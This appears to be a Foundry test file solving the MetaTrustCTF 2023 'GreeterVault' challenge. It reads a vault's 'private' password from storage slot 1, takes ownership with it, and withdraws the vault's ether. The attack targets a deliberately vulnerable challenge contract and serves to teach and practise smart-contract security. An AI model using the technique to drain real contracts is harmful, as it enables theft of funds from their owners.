// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/MetaTrustCTF_2023/GreeterVault/Vault.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Setup setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(deployer, 1 ether);

        bytes32 password = keccak256(abi.encode("password"));
        setup = new Setup{value: 1 ether}(password);

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", setup.isSolved());
        vm.stopPrank();
    }

    function solve() public {
        bytes32 password = vm.load(address(setup.vault()), bytes32(abi.encode(1)));
        VaultLogic vault = VaultLogic(address(setup.vault()));
        vault.changeOwner(password, payable(attacker));
        vault.withdraw();
    }
}


